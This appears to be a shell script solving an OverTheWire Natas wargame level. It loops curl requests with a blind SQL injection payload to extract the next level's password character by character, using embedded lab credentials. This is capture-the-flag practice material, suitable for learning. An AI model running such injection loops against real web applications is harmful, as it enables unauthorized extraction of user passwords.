#!/bin/bash


p=""
len=${#p}
while [ $len -lt 32 ]
do

	for x in {a..z} {A..Z} {0..9}
	do
		url="http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20binary%20%22$p$x%"
		result=$(curl "http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20binary%20%22$p$x%" -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J | grep -o "This user exists")
		echo "Trying $p$x"
		echo "Trying $url"
		if [[ $result == "This user exists" ]]
		then
		p+=$x
		len=${#p}
		echo "this url matched: $url"
		break
		fi
		
	done


done

echo $p

#result=$(curl 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20%27%w%%27%22' -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J | grep -o "This user exists")

#if [[ $result == "This user exists" ]]
#then
#	echo "add password"
#fi

